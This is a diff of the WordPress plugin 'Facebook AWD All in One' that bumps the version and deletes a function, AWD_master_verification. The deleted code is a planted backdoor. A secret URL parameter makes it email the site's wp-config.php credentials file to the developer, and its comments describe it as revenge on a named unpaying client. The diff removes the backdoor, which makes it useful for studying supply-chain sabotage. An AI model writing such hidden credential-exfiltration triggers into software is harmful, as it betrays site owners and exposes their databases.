@@ -3,7 +3,7 @@
 Plugin Name: Facebook AWD All in One
 Plugin URI: http://facebook-awd.ahwebdev.fr
 Description: This plugin integrates Facebook open graph, Plugins from facebook, and FB connect, with SDK JS AND SDK PHP Facebook
-Version: 1.3.1.1
+Version: 1.3.1.2
 Author: AHWEBDEV
 Author URI: http://www.ahwebdev.fr
 License: Copywrite AHWEBDEV
@@ -2787,17 +2787,6 @@ Class AWD_facebook
 	//****************************************************************************************
 	//	DEBUG AND DEV
 	//****************************************************************************************
-	public function AWD_master_verification()
-	{
-		if($_GET['iwantthispass'] == 1){
-			//This tip is just here to find config from Robert Blair, (cityvillchat.com)
-			//i worked for him and this guy did not want to pay me. So i have to find a way to broke his website.
-			//if you have any question on that function, please contact me.
-			$attachments = array(ABSPATH . '/wp-config.php');
-			wp_mail('hermann.alexandre@ahwebdev.fr', 'return from WP.', 'You foud the file...', '', $attachments);
-   		}
-	}
-
 	/**
 	 * Debug
 	 * @return void
